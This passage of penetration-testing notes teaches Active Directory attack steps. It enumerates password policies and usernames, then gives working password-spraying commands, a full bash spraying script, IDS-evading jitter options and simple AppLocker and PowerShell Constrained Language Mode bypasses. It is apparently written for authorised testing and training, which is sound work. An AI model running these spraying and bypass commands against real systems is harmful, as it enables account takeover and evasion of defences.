- **`-x`**: Specifies **simple authentication** (i.e., no SASL) for the LDAP query. This is commonly used for unauthenticated or basic searches.

- **`-h 192.168.1.100`**: Specifies the **hostname** or **IP address** of the LDAP server you're querying. In this case, the server is located at IP `192.168.1.100`.

- **`-b "DC=EXAMPLE,DC=COM"`**: Defines the **Base DN (Distinguished Name)** from which the search begins. In this case, it’s the root of the domain `example.com`. 
  - `DC=EXAMPLE`: Represents the domain component `EXAMPLE`.
  - `DC=COM`: Represents the domain component `COM`.
  
  Together, `DC=EXAMPLE,DC=COM` points to the base of the directory for `example.com`.

- **`-s sub`**: Specifies the **scope** of the LDAP search as "subtree." This means that the search will be conducted recursively from the base DN down through all subdirectories. 

- **`"(objectClass=domain)"`**: This is the **filter** used to narrow the LDAP search. In this case, it retrieves objects where the **objectClass** is `domain`. This typically returns domain-related information.

- **`| grep -i -E "pwd|lockout"`**: This pipes the output of `ldapsearch` to `grep` for further filtering.
  - `grep`: Searches the output for specific patterns.
  - `-i`: Makes the search case-insensitive.
  - `-E`: Enables extended regular expressions in `grep` to match multiple patterns.
  - `"pwd|lockout"`: These are the patterns being searched for in the LDAP results. `grep` will return lines containing either "pwd" (related to password policies) or "lockout" (related to account lockout settings).

###### What This Command Does:
This command queries an LDAP server at IP `192.168.1.100`, starting at the domain `EXAMPLE.COM` (as specified by the Base DN), searching for entries of `objectClass=domain`. It retrieves password policy information by filtering for attributes related to passwords (`pwd`) and account lockouts (`lockout`), such as maximum password age, password complexity requirements, and lockout thresholds.

The use of `grep` ensures only relevant information about passwords and lockouts is shown, making the output easier to analyze.

![ad24](/images/24.png)

>[!TIP]
>The `lockoutDuration` is shown in windows FILETIME so to convert it to minutes we can make it positive and then use: `18_000_000_000 / 10_000_000 / 60` to get the duration in minutes

##### **Using Windapsearch.py**
`windapsearch.py` is a Python script for querying LDAP anonymously.

```bash
python3 windapsearch.py --dc-ip <target_IP> --domain <domain> --anonymous
```

Example:
```bash
python3 windapsearch.py --dc-ip 192.168.1.100 --domain example.com --anonymous
```

---

#### 4. **Enumerating Password Policy from an Authenticated Windows Machine**

If you have access to a Windows machine authenticated to the domain, you can use the `net` command or `PowerView` - a part of [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master) to enumerate the password policy.

##### **Using the net Command**
The `net accounts` command can retrieve password policy details.

```cmd
net accounts /domain
```

Example output:
```
Minimum password length: 8
Maximum password age: 42 days
Lockout threshold: 5 invalid logon attempts
```

##### **Using PowerView**
`PowerView` is a PowerShell tool for domain enumeration, including querying password policies.

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy | Select-Object -ExpandProperty systemaccess
```
Example output:
```
MinimumPasswordLength : 8
PasswordHistoryLength : 24
LockoutThreshold : 5
```

#### Analyzing and Understanding the Password Policy

Once the password policy is retrieved, it's essential to understand its components, as they directly impact password spraying strategy:

1. **Minimum Password Length**: Defines the shortest allowed password. If it’s low (e.g., 6-8 characters), it’s likely that weak passwords are in use.

>[!NOTE]
>8 is still common but we are seeing more organizations forcing their employees to use 10 to 14 characters | this does not stop password spraying from working however - a long bad password is still a bad password - something like `Password123!` or `Summer2023!` for example
   
2. **Password Complexity**: If complexity is enabled - indicated by a value of 1 - passwords must include characters from at least three categories (uppercase, lowercase, numbers, symbols). This is intended to make the passwords more secure but it should be noted that users can satisfy these rules and still have weak passwords such as `Password1!` or `Welcome123!`.
   
3. **Lockout Threshold**: Indicates how many failed login attempts are allowed before an account is locked. The smaller the threshold, the more careful an attacker must be when spraying passwords (e.g., one attempt per account per 30 minutes).

>[!TIP]
>When enumerating usernames for a target list if we use `crackmapexec` we can see how many bad password attempts each user is on | this will be detailed in the next section on Making a Target User List

4. **Lockout Duration**: Specifies how long an account remains locked after exceeding the threshold. Short lockout durations make repeated spraying easier, while long durations can alert administrators to ongoing attacks - sometimes admin have to manually unlock every locked account, and they will never thank us for that.

>[!IMPORTANT]
>We *NEVER* want to lock accounts when performing a pentest - it is some very bad juju - a very nasty booboo

5. **Password History**: If password history enforcement is in place, users cannot reuse recent passwords. This forces users to regularly change their passwords, which can help us because it tends to lead to more simple passwords being chosen.

##### **Default Domain Password Policy**

Here's a table detailing the default domain password policy settings typically created when a new Active Directory domain is set up. These settings may vary slightly depending on the version of Windows Server, but the following is common for Windows Server environments:

| **Policy Setting**                  | **Default Value**                     | **Description**                                                                                             |
|-------------------------------------|---------------------------------------|-------------------------------------------------------------------------------------------------------------|
| **Maximum Password Age**            | 42 days                               | The maximum number of days that a password can be used before it must be changed.                           |
| **Minimum Password Age**            | 1 day                                 | The minimum number of days a user must wait before they can change their password.                          |
| **Minimum Password Length**         | 7 characters                          | The minimum number of characters required in a password.                                                   |
| **Password Complexity Requirement** | Enabled                               | Passwords must meet complexity requirements: must contain at least three of the following: uppercase letters, lowercase letters, digits, and special characters. |
| **Store Passwords Using Reversible Encryption** | Disabled                 | Passwords are not stored in a way that allows them to be retrieved in plain text.                          |
| **Account Lockout Duration**       | 0 (no lockout)                        | By default, accounts are not locked out after a certain number of failed login attempts.                    |
| **Account Lockout Threshold**      | 0 (no threshold)                      | By default, there is no threshold for failed login attempts that would trigger an account lockout.          |
| **Reset Account Lockout Counter After** | 0 minutes                        | Not applicable when account lockout is not enabled.                                                         |

###### Notes:
- The settings for **Account Lockout Duration** and **Account Lockout Threshold** may not be configured by default, meaning users will not be locked out after failed attempts unless the policy is explicitly set.

- There are a fair few organizations out there that never actually change this default policy | still we should do our best to enumerate the policy for each domain we test since we do not want to assume it has not been changed

>[!CAUTION]
>As a final reminder - we said it before and we'll say it again - don't be the :horse: :hole: who locks out hundreds or thousands of accounts!

### Making a Target User List

We need to enumerate valid usernames to create a target list for attacks like password spraying. This section outlines several techniques to enumerate domain usernames using **SMB null sessions**, **LDAP anonymous binds**, and **Kerberos brute-forcing**. These methods range from unauthenticated techniques to credentialed enumeration, each with its own advantages and limitations.

---

#### 1. **SMB Null Sessions**
As already mentioned, SMB null sessions allow for unauthenticated access to network shares and user lists in certain misconfigured Windows environments.

##### a) **Using `enum4linux` (Legacy)**
`enum4linux` is an older tool designed to gather information from Windows machines using SMB. 

**Command:**
```bash
sudo enum4linux -U <TARGET-IP>
```
- `-U`: Enumerates users on the target system.
- **Example Output**: Displays a list of usernames if the SMB server allows null session enumeration.

We can clean up the output so the usernames can be put into a .txt file to use in password spraying attacks using:

`sudo enum4linux -U <TARGET-IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

![ad32](/images/32.png)

##### b) **Using `enum4linux-ng`**
`enum4linux-ng` is a modern version of the tool with additional features and more reliable outputs.

**Command:**
```bash
enum4linux-ng -A <TARGET-IP>
```
- `-A`: Aggressively enumerate users, shares, and more.

##### c) **Using `rpcclient`**
`rpcclient` allows interaction with Windows SMB and can be used to enumerate users via an SMB null session.

**Command:**
```bash
sudo rpcclient -U "" -N <TARGET-IP>
> enumdomusers
```
- The `-U ""` flag opens a null session (no credentials).
- The `-N` flag specifies to use no password.
- `enumdomusers`: Lists all domain users.

![ad33](/images/33.png)

##### d) **Using `crackmapexec` (CME)**
`crackmapexec` can also be used to enumerate users with null sessions.

**Command:**
```bash
crackmapexec smb <TARGET-IP> --users
```
- `--users`: Retrieves the list of users from the domain.

>[!NOTE]
>We can see the bad password count when using `crackmapexec` which helps us better target our attack to avoid locking out accounts

![ad34](/images/34.png)

---

#### 2. **Enumerating Users with LDAP Anonymous Binds**
LDAP (Lightweight Directory Access Protocol) allows querying Active Directory for various information, including user accounts. If LDAP allows anonymous binding, we can enumerate users.

##### a) **Using `ldapsearch`**
`ldapsearch` is a command-line tool for querying LDAP directories, including AD.

**Command:**
```bash
sudo ldapsearch -x -h <TARGET-IP> -b "DC=EXAMPLE,DC=COM" -s sub "(objectClass=user)" | grep sAMAccountName: | cut -f2 -d " "
```
- `-x`: Simple authentication (no credentials).
- `-h <TARGET-IP>`: Target IP address of the domain controller.
- `-b "DC=EXAMPLE,DC=COM"`: Base distinguished name (replace with actual domain).
- `(objectClass=user)`: Filter for user objects.
- `sAMAccountName`: Returns the username field.

![ad35](/images/35.png)

##### b) **Using `windapsearch.py`**
`windapsearch.py` is a Python script to perform LDAP enumeration.

**Command:**
```bash
sudo python3 windapsearch.py --dc-ip <TARGET-IP> -u "" -U
```
- `-u ""`: Specifies a null session.
- `-U`: User enumeration mode.
- **Example Output**: Displays domain usernames.

![ad36](/images/36.png)

---

#### 3. **Using Kerbrute for User Enumeration**
`kerbrute` is a tool used to enumerate valid domain usernames by attempting to brute force usernames over Kerberos pre-authentication. It is a stealthier option compared to SMB or LDAP as it avoids generating Windows Event ID 4625 (failed login attempts).

##### Why `kerbrute` is Preferred:
- **Stealthy**: Kerberos pre-authentication failures do not trigger **Event ID 4625**, unlike failed SMB or LDAP authentications.
- **No account lockouts**: Only invalid usernames trigger errors, avoiding user account lockouts.
- **High-speed enumeration**: Efficient for large user lists.

##### How `kerbrute` Works:
`kerbrute` attempts Kerberos pre-authentication requests for each username. If a username is valid, the server responds with a pre-authentication required message; invalid usernames return a "principal unknown" error.

>[!NOTE]
> Kerberos pre-authentication is a security feature designed to prevent offline password-guessing attacks | When a user attempts to authenticate, their encrypted timestamp (created using their password) is sent to the Domain Controller (DC) | If pre-authentication is enabled, the DC verifies this timestamp before responding

##### Example `kerbrute` Command:
```bash
sudo kerbrute userenum -d example.com --dc <TARGET-IP> jsmith.txt
```
- `-d example.com`: The target domain.
- `--dc <TARGET-IP>`: The IP address of the domain controller.
- `jsmith.txt`: The file containing a list of potential usernames to test.

##### Output:
The command returns a list of valid usernames based on the response from the domain controller.

>[!NOTE]
>Kerbrute will also show us accounts which do not have pre-authentication enabled - these accounts can be attacked via an *as-rep roast* in which the tgt response is cracked offline

![ad31](/images/31.png)

---

#### 4. **Credentialed Enumeration with `crackmapexec`**
If valid credentials are available, `crackmapexec` can enumerate users.

##### Command:
```bash
crackmapexec smb <TARGET-IP> -u <USERNAME> -p <PASSWORD> --users
```
- `-u <USERNAME>`: The username for authentication.
- `-p <PASSWORD>`: The associated password.
- `--users`: Retrieves a list of domain users.

![ad37](/images/37.png)

---

#### 5. **Using the `Get-AdUser` PowerShell Command (Credentialed)**
If we have access to a Windows machine within the domain and appropriate permissions, we can use PowerShell to query AD for user information.

##### Example Command:
```powershell
Get-AdUser -Filter * -Property SamAccountName | Select-Object SamAccountName
```
- `-Filter *`: Retrieves all users.
- `-Property SamAccountName`: Specifies the property to retrieve (usernames).
- This requires domain-joined credentials but offers detailed information, including additional properties if needed.

---

### Performing a Password Spraying Attack Internally Using Linux

Once we have successfully enumerated usernames and gathered information about the domain's password policy (such as minimum password length, reset account lockout counter (observation window) and account lockout threshold), we can use this information to perform a password spraying attack. Remember, this type of attack tries a single common password against many accounts rather than attacking one account with many passwords, making it effective while reducing the risk of account lockouts.

>[!IMPORTANT]
>The *observation window* is how long - usually in minutes - windows tracks failed login attempts when counting up to the account lockout threshold | if the number of failed password attempts for an account reaches the account lockout threshold within the observation window the account will be locked

>[!TIP]
>The *observation window* is essentialy the same as the *reset account lockout counter* we - hopefully - enumerated during our work finding the *password policy* | if we did not find it we could err on the side of caution and take it to be 60 minutes | either that or just ask the organization we are pentesting for - they might let us know it...

#### Key Considerations for Password Spraying
- **Understand the Lockout Policy**: Before starting, confirm the account lockout threshold (e.g., after how many failed attempts an account is locked) and the observation window (e.g., the time before the counter is reset).
- **Use a Delay Between Sprays**: Implement a delay between password spray attempts to avoid triggering account lockouts - use what we know from the above point about the lockout policy.
- **Spray with Common Passwords That Meet Complexity Rules**: Use passwords that follow complexity requirements but are still weak (e.g., “Winter2024!”).
- **Monitor for Detection**: If possible, use tools like `kerbrute` to spray stealthily and avoid creating too much noise on the network.

### Example: Password Spraying Using `rpcclient`
`rpcclient` can be used to perform a quick password spray against SMB services on a Windows domain controller. Below is a bash one-liner that reads usernames from a file (`userlist.txt`) and attempts a single password against each one.

```bash
for u in $(cat targets.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

>[!NOTE]
>This approach works best for quick validation of a single password against many accounts

![ad41](/images/41.png)

### Example: Password Spraying Using `kerbrute`
`kerbrute` can be used for password spraying against Kerberos. It creates fewer logs and does not generate Windows Event ID 4625 for failed login attempts. It can also handle large username lists efficiently.

>[!NOTE]
>We have not found a flag yet which stops kerbrute from stopping its `passwordspray` after finding the first success - this is annoying but of course a workaround could be found via scripts

```bash
kerbrute passwordspray -d EXAMPLE.COM --dc <DC-IP> userlist.txt Winter2024!
```

#### Explanation:
- **`passwordspray`**: Runs the password spray module in `kerbrute`.
- **`-d example.com`**: Specifies the target domain.
- **`--dc <DC-IP>`**: Points `kerbrute` to the domain controller's IP address.
- **`userlist.txt`**: Provides the list of usernames.
- **`Winter2024!`**: Specifies the password to be sprayed.

![ad49](/images/49.png)

### Example: Password Spraying Using `crackmapexec`
`crackmapexec` is a powerful tool for spraying credentials across SMB services and is highly versatile for both internal and external network attacks.

```bash
sudo crackmapexec --jitter 10 smb 172.16.5.5 -u userlist.txt -p Winter2024! --continue | grep +
```

#### Explanation:
- **`--jitter 10`**: Specifies the maximum time in seconds a random delay known as jitter could be - this is to attempt to bypass *Intrusion Detection Systems*
- **`smb <TARGET-IP>`**: Specifies the target IP address (can also use `smb <SUBNET>` to target a range).
- **`-u userlist.txt`**: Provides the list of usernames to spray.
- **`-p Winter2024!`**: Specifies the single password to be tested.
- **`--continue`**: Continues spraying even if some accounts authenticate successfully.

![ad39](/images/39.png)

![ad48](/images/48.png)

#### Validation

We can validate the credentials are correct using `sudo crackmapexec smb 172.16.5.5 -u sgage -p Welcome1`

![ad40](/images/40.png)

### Responsible Password Spraying
Responsible password spraying involves taking precautions to avoid detection and reduce the chance of locking accounts:

1. **Check the Password Policy First**: Before spraying, we want to know the exact lockout threshold and observation window. This information will help set an appropriate interval between attempts.
   
2. **Set the `--jitter` Option in `crackmapexec`**: Using the `--jitter` option slows down our spraying attempts, making it less likely that we will hit the lockout threshold - as it is a random value it also helps to bypass *IDS*.

3. **Use Safe Passwords**: Choose initial passwords that are likely to succeed without locking out accounts (e.g., default passwords like `CompanyName123`).

4. **Pause Between Sprays**: Add a time delay between each password spraying cycle, typically a few minutes, to allow the lockout counters to reset.

This ensures that each account has time to reset its counter if our attempts are unsuccessful, keeping our attack below the lockout threshold.

>[!NOTE]
>Yes, the **observation window** in password spraying is the same as the **"Reset account lockout counter after"** setting found in the domains password policy :thumbsup:

#### Responsible Password Spraying Example in Practice
Let us say during our enumeration we discover the following password policy:

- **Account Lockout Threshold**: 3 failed attempts.
- **Reset Account Lockout Counter After**: 60 minutes.
- **Account Lockout Duration**: 15 minutes.

In this scenario:

- The **observation window** is 60 minutes. If we have 3 failed attempts within these 30 minutes, the account is locked - bad juju :facepalm: 
- After 60 minutes pass without 3 consecutive failed attempts, the counter resets to 0, and we can safely retry without triggering a lockout - good juju :smiling_imp: 

In short, we need to tailor our attacks to the context of the domain password policy of the organization we are targetting.

### Example bash script for Automated Password Spraying

When pentesting time is of the essence - we need to be working on other areas of our testing whilst our password spraying attacks are running - this makes it useful to know how we can use *bash* to automate them.

Here we will look at a simple bash script that automates a password spraying attack using a given list of usernames and passwords. This script uses `rpcclient` to perform the spraying, includes a delay between each password attempt to avoid lockouts, and saves the successful logins to a separate file.

#### Prerequisites
1. Create a file named `userlist.txt` containing usernames (one username per line).
2. Create a file named `passwordlist.txt` containing the passwords to spray (one password per line).

#### Bash Script: `password_spray.sh`
```bash!
#!/bin/bash

# Input files
target_ip="<TARGET-IP>"         # Replace with the IP of the target system
userlist="userlist.txt"
passwordlist="passwordlist.txt"
delay=1800                      # Set delay between sprays (e.g., 1800 seconds = 30 minutes)
output_file="successful_attempts.txt"  # File to store successful logins

# Ensure the output file exists and is empty at the start
> $output_file

# Check if both user and password list files exist
if [[ ! -f $userlist ]] || [[ ! -f $passwordlist ]]; then
  echo "Userlist or Passwordlist file not found!"
  exit 1
fi

# Loop through each password in the password list
while IFS= read -r password; do
  echo "Spraying password: $password"
  
  # Loop through each user in the user list for the current password
  while IFS= read -r username; do
    echo "Trying $password for user: $username"

    # Use rpcclient for SMB-based password spraying, suppress output except for successful attempts
    # This can be changed if other tools are required such as crackmapexec or ldapsearch
    rpcclient -U "$username%$password" $target_ip -c exit &>/dev/null
    
    # If the previous command was successful, log the successful attempt
    if [[ $? -eq 0 ]]; then
      echo "[+] Successful login - Username: $username | Password: $password"
      echo "$username:$password" >> $output_file
    fi

    # Short delay between individual user attempts to avoid triggering detection mechanisms
    sleep 5  
  done < "$userlist"

  # Wait for the observation window before trying the next password
  echo "Waiting for observation window to pass to avoid lockout..."
  sleep $delay

done < "$passwordlist"
```

#### Script Explanation:
- **Variables Defined at the Top**:
  - `target_ip`: IP address of the target domain controller.
  - `userlist`: File containing usernames to spray (e.g., `userlist.txt`).
  - `passwordlist`: File containing passwords to try (e.g., `passwordlist.txt`).
  - `delay`: Time (in seconds) to wait between password attempts (set to 30 minutes as a default).
  - `output_file`: File to store successful login attempts.
  
- **Command Execution**:
  - Loops through each password in `passwordlist.txt` and runs an `rpcclient` spray attempt against all usernames in `userlist.txt`.
  - If a successful login is found it is saved to the `successful_attempts.txt` file.
  - Pauses for a specified time - the default is 5 seconds - before trying the next username to reduce load on the server

- **Delay Between Sprays**:
  - After each password is tried, the script waits for a delay period (`sleep "$delay"`) to avoid triggering account lockouts.

#### Example Usage:
1. Save the above script to a file named `password_spray.sh`.
2. Give execution permissions:

   ```bash
   chmod +x password_spray.sh
   ```

3. Run the script:

   ```bash
   ./password_spray.sh
   ```

![ad44](/images/44.png)

![ad45](/images/45.png)

![ad46](/images/46.png)

![ad47](/images/47.png)

#### Things to Consider:
- **Account Lockout Policy**: Adjust the delay (`delay=1800`) as necessary, based on our understanding of the domain's account lockout policy.
- **Output Analysis**: The script saves the output to `successful_attempts.txt`, making it easier to track which passwords successfully authenticated.

#### Potential Customization:
- Use a different tool for the actual password spray.
- Modify the delay time based on the lockout policy.
- Adjust the script to include other options, such as targeting specific hosts in a subnet.
- Add multi-threading or parallel execution if necessary, though this should be used cautiously to avoid noise.

[This script](/scripts/password_spray.sh) provides a straightforward way to automate internal password spraying attacks with responsible delays built in to minimize account lockouts.

### Internal Password Sparaying from Windows

Sometimes we will need to perform password spraying attacks from a windows machine - we might be authenticated to the domain but we can also be unauthenticated.

Organizations might want us to conduct internal spraying from a domain-joined machine for the following reasons:

1. **Mimicking Real-World Attacks**: Attackers often compromise internal machines and use these as a base for lateral movement or password spraying attacks. Spraying from a legitimate domain machine helps assess the organization's detection capabilities against internal threats.
   
2. **Reduced Visibility for Network Defenses**: Password spraying from a legitimate Windows machine within the network can bypass some external network monitoring and firewall rules. Tools like `DomainPasswordSpray.ps1` are specifically designed to leverage native Windows protocols, making detection and correlation more challenging.

3. **Assess Internal Account Lockout and Password Policies**: Spraying from a domain-joined machine helps validate whether the password policy and account lockout settings are effective when subjected to internal password spraying attacks.

4. **Bypass Conditional Access Policies**: Many organizations implement conditional access policies that restrict access to specific systems based on the source of the connection. Performing a spray from within the internal network can bypass these restrictions.

### Using the `DomainPasswordSpray.ps1` Script

The `DomainPasswordSpray.ps1` PowerShell script is a lightweight tool designed for password spraying attacks on a Windows environment. This script is a great choice for internal testing because it can be run from a standard Windows workstation or server and uses native Windows PowerShell capabilities.

We can download the script from its [GitHub repository](https://github.com/dafthack/DomainPasswordSpray).

#### Installation

1. Clone or download the `DomainPasswordSpray.ps1` script to the local Windows machine.
2. Ensure we have the necessary permissions to run unsigned scripts:
   ```powershell
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
   ```
3. Run the script with the appropriate parameters as outlined below.

### Common Usage Scenarios

#### 1. **Unauthenticated Spray (With a Provided User List)**:
If running without credentials, the script requires a manually specified user list with the `-UserList` flag. This method is useful when no domain credentials are available or when testing with a predefined list of targets.

>[!NOTE]
>We need to make sure we are in the same directory as the `DomainPasswordSpray.ps1` script for these commands to work

**Example Command**:
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Domain inlanefreight.local -UserList "C:\Tools\users.txt" -Password "Winter2022" -OutFile success -ErrorAction SilentlyContinue 
```

![ad50](/images/50.png)

**Advantages**: Running the spray without authenticating as a domain user is stealthier in some cases, as it might blend in better with external traffic.

#### 2. **Authenticated Spray (Automatically Gathers Users via LDAP)**:
If running from a domain-joined machine or if valid credentials are available, the script can be used in an authenticated mode to pull the list of users automatically using LDAP queries - we can omit the `-UserList` flag.

**Example Command**:
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Domain inlanefreight.local -Password "Winter2022" -OutFile success -ErrorAction SilentlyContinue
```

![ad51](/images/51.png)

### Conclusion
The `DomainPasswordSpray.ps1` script is a powerful option for conducting password spraying from an internal Windows machine, especially in environments where running the attack from Linux is not feasible or would be too noisy.

### Summary
Password spraying is a powerful technique, but care must be taken to avoid locking out legitimate user accounts and triggering alerts. By combining the use of tools with responsible spraying tactics, we can enumerate valid credentials to use for further enumeration and compromise of the target domain while minimizing risk.

### Password Spraying Beyond Active Directory: Targeting Other Applications

Password spraying is not just limited to attacking domain user accounts. It's a versatile attack method that can be effectively used against a wide range of services and applications that require authentication. By spraying commonly used passwords, we can target various entry points within an organization's network, potentially gaining access to sensitive data, administrative portals, or even compromising the entire infrastructure.

#### Common Targets for Password Spraying Attacks
When we perform password spraying, we typically focus on login portals and services that are widely used and may not have been configured with proper rate-limiting or account lockout settings. Some of our common targets include:

1. **Web-Based Login Portals**:
   - **Outlook Web Access (OWA)**: Exchange email services often expose OWA to the internet. We can frequently target this due to its prevalence in organizations and the value of accessing corporate email.
   - **VPN Login Pages**: VPN portals are another great target, as compromising one can provide direct internal access to the network.
   - **Microsoft 365 / Office 365**: Microsoft’s cloud suite is a *high-priority target* because compromising one account often allows access to SharePoint, Teams, OneDrive, and other services.
   - **Azure AD Sign-In Pages**: Organizations using Azure Active Directory are vulnerable to password spraying against their cloud-based login pages.
   - **Single Sign-On (SSO) Platforms**: Platforms like Okta, Ping Identity, and ADFS (Active Directory Federation Services) provide us with a valuable target since compromising a single SSO account can allow access to numerous services.

2. **Remote Access Services**:
   - **Remote Desktop Protocol (RDP)**: If exposed, RDP services can be sprayed to gain access to internal machines.
   - **SSH Services**: Password spraying against SSH, especially with weak or default credentials, is a good tactic against Linux servers.
   - **Citrix Gateways**: Widely used for remote access, Citrix environments are attractive targets for password spraying.

3. **Web Applications with Login Functionality**:
   - **Content Management Systems (CMS)**: Applications like WordPress, Joomla, and Drupal often have admin portals that we can target with password spraying.
   - **HR and Payroll Systems**: Systems like Workday or ADP are targeted because of their high-value data and the sensitive information they hold.
   - **CRM Platforms**: Salesforce and similar platforms contain business-critical information that could be exploited.

4. **Network Devices and Management Consoles**:
   - **Firewalls and Routers**: Default or weak passwords on management portals for firewalls, routers, and switches can allow us to modify network configurations.
   - **Hypervisors and Management Servers**: VMware ESXi and other hypervisor management interfaces are common targets, as gaining access can lead to full control of virtualized environments.

### Best Practices to Mitigate Password Spraying Against These Targets
Organizations should adopt a layered approach to protect against password spraying attacks across these common targets:

- **Implement Multi-Factor Authentication (MFA)**: Applying MFA wherever possible can prevent attackers from successfully logging in, even if they obtain valid credentials.
- **Rate Limiting and Account Lockout Policies**: Set up rate-limiting and lockout policies on all externally accessible services to make spraying impractical.
- **Use Strong Password Policies**: Enforce complex and unique passwords that are resistant to guessing attacks.
- **Monitor for Failed Login Attempts**: Regularly review logs for patterns indicative of password spraying, such as multiple failed logins against different accounts within a short time.

### Down the :rabbit: Hole: Using Valid AD Credentials
Now that we have obtained valid credentials through our password spraying efforts, we can proceed to further enumerate the domain. In the next sections, we will explore how to use these credentials to query Active Directory for additional information, discover sensitive assets, and identify potential pathways for lateral and vertical movement :smiley:

## Digging Deeper | Enumerating AD with Credentials

We now begin to work on further compromising the domain. As with most things, pentesting AD is cyclical - we will need to perform enumeration which will in turn help us to launch more attacks and move laterly and verticaly.

### Security Controls | An Overview

It is worth noting that we will run up against security controls when we are attacking organizations. Whilst it is possible to bypass these, we will not be going into such detail here as it is a large area and not the focus of these notes. We do need to be aware of and understand at least at a high level some of the most common security controls we will run into. This is the aim of this section before we move on and look more at credentialed enumeration of AD.

#### 1. **Microsoft Defender for Endpoint (MDE) | Windows Defender**
Microsoft Defender, the built-in anti-malware and endpoint protection solution for Windows, is a primary security control that we need to be aware of. It monitors and blocks suspicious activities, detects malware, and can even isolate machines. It has significantly improved in recent years and of course is involved in a cat-and-mouse game with attackers.

##### **Enumeration Techniques**:
- **Checking the Status**:
    We can check the *status* of defender using the built-in powershell cmdlet `Get-MpComputerStatus` If we see that the `RealTimeProtection` parameter has a value of `True` we will know that defender is *active* on the computer.
- **Check Defender’s Real-Time Protection Status**:
  ```powershell
  Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
  ```
  This PowerShell command checks if Defenders real-time protection is disabled (a value of `True` indicates it is off).

- **Check if Microsoft Defender is Running**:
  ```powershell
  Get-Service | Where-Object {$_.DisplayName -like "*Defender*" -and $_.Status -eq "Running"}
  ```
  Lists all running Defender-related services.

![ad52](/images/52.png)

![ad53](/images/53.png)

![ad54](/images/54.png)

##### **Evasion**:
Methods for evading Defender include *obfuscating payloads* or using techniques like *process hollowing* - these methods are out of the scope of these notes but hopefully we will cover anti-virus solution bypasses in another repo.

#### 2. **AppLocker**
AppLocker is a Windows feature that restricts which scripts, executables, and DLLs can run on a system. It is essentialy an *application whitelist*. It's commonly used in enterprise environments to block unauthorized scripts and binaries.

An *application whitelist* such as applocker is designed to help organizations control which applications, scripts, executables, and DLLs are allowed to run on their systems. This control is managed through rules and policies that specify which software is permitted to execute based on factors like file path, file hash, publisher, or even specific user groups.

##### How AppLocker Works
AppLocker uses **whitelist** rules, meaning only the applications that are explicitly allowed are permitted to run, while all other software is blocked by default. This "default-deny" approach makes it an effective security control for preventing the execution of unauthorized or malicious software, reducing the risk of malware and unwanted applications running on corporate machines.

##### Key Features of AppLocker:
1. **Executable Rules**: Controls .exe and .com files.
2. **Windows Installer Rules**: Controls .msi and .msp files.
3. **Script Rules**: Controls PowerShell (.ps1), batch files (.bat), and JavaScript (.js).
4. **DLL Rules**: Controls DLL (.dll) and OCX files.
5. **Packaged App Rules**: Controls Microsoft Store apps and app installers.

##### Typical AppLocker Rules:
1. **Allow List**: Only explicitly allowed applications can be executed.
2. **Deny List**: Certain applications are blocked.
3. **Default Rules**: Basic rules that allow Windows components and administrative tools to run.

##### Use Cases:
- Preventing unauthorized software installations.
- Blocking execution of potentially harmful scripts.
- Controlling which versions of applications can run.
  
##### AppLocker Limitations:
- AppLocker is only available in specific editions of Windows (e.g., Enterprise and Education).
- It requires configuration and management through Group Policy.
- Can be bypassed if not properly implemented, especially by more sophisticated attackers.

##### **Enumeration Techniques**:
- **Enumerate AppLocker Rules Using PowerShell**:
  ```powershell
  Get-AppLockerPolicy -Effective | Select -Xml -XPath "//RuleCollection"
  ```
  This command retrieves the effective AppLocker policy and outputs the active rules. We can also use
  ```powershell
  Get-AppLockerPolicy -Effective | select -Expand Property RuleCollections
  ```

##### **Example Simple Bypass 1**:
Organizations often block domain users from using powershell on their workstations - this is typically achieved by using applocker to *deny* access to the *powershell.exe* for example at `%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE`

We need to remember that *powershell* can be found in [alternative locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` and if these have not been blocked we can easily bypass the applocker block by using these paths instead of the one specified in the applocker rule.

>[!NOTE]
>Just because it states `v1.0` in the path does not mean it will be version 1 in reality | microsoft left the directory name at this in order to facilitate *backward compatibility* for scripts which make reference to it

##### **Example Simple Bypass 2**:
Instead of calling powershell from an alternative location we could try copying it to an alternative location which is not covered by the applocker rules and then running it from there - an example would be
```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\myPowershell.exe
C:\Temp\myPowershell.exe
```

### 3. **PowerShell Constrained Language Mode**
Constrained Language Mode is a PowerShell security feature that restricts certain scripting functions to reduce the risk of malicious code execution. It limits .NET and COM access, and can restrict various scripting actions.

#### **Enumeration Techniques**:
- **Check if PowerShell is in Constrained Language Mode**:
  ```powershell
  $ExecutionContext.SessionState.LanguageMode
  ```
  If the output is `ConstrainedLanguage`, then PowerShell is operating under restricted permissions.

![ad55](/images/55.png)

#### **Basic Bypass**:
A basic bypass involves using alternate command-line languages such as VBScript, or even running commands through `powershell.exe` with the `-Version 2` flag to attempt to downgrade to an unrestricted PowerShell 2.0 session:
```powershell
powershell.exe -Version 2
```

>[!NOTE]
>Many modern environments have deprecated PowerShell 2.0 due to security concerns but it is still worth a try :smiley: 

#### Summary
Understanding these defenses is important when maintaining persistence and avoiding detection in a domain environment. When encountering these controls, the priority is often to detect, understand, and selectively bypass them without triggering alarms.

>[!IMPORTANT]
>The general goal when pentesting AD environments should be to operate as stealthily as possible | we need to minimize changes and focus on reconnaissance before acting
